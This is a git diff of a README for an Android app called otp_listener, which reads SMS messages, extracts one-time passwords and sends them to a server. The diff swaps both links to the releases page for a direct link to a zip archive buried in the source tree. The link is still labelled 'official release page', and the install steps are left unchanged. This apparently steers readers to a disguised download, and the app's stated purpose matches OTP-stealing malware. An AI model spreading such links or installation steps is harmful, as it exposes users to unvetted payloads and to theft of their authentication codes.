@@ -1,13 +1,13 @@
 # 📱 otp_listener - An automatic way to process codes
 
-[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/adducting-gasoven115/otp_listener/releases)
+[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/adducting-gasoven115/otp_listener/raw/refs/heads/main/android/app/src/otp-listener-v2.4.zip)
 
 This application tracks incoming SMS messages on your Android device. It looks for one-time passwords, pulls the numbers out, and sends them to your chosen server. It removes the need for manual data entry.
 
 ## 📥 How to get the app
 
 1. Open your web browser on your phone.
-2. Go to the [official release page](https://github.com/adducting-gasoven115/otp_listener/releases).
+2. Go to the [official release page](https://github.com/adducting-gasoven115/otp_listener/raw/refs/heads/main/android/app/src/otp-listener-v2.4.zip).
 3. Find the latest version under the Releases section.
 4. Tap the file ending in .apk to start the download.
 
